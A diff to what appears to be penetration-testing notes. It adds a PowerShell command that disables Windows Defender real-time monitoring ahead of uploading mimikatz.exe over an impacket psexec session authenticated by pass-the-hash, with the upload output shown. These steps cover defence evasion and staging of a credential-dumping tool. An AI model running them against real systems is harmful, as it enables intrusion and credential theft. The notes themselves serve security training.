@@ -405,11 +405,15 @@ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:57c5a5bc7c0e1f98e9c9d81
 - Transfer files=:
 
 ```bash
+
+#Disabling windows real time protection
+powershell.exe -c "Set-MpPreference -DisableRealtimeMonitoring $true"
 C:\Windows\system32> lput mimikatz.exe
 [*] Uploading mimikatz.exe to ADMIN$\/
 C:\Windows\system32> cd C:\windows
 C:\Windows> dir /b mimikatz.exe
 mimikatz.exe
 ```
+<img width="465" height="183" alt="image" src="https://github.com/user-attachments/assets/be80f534-fdd0-41fd-a1f4-f83a93ba5b0a" />
 
 -----------------
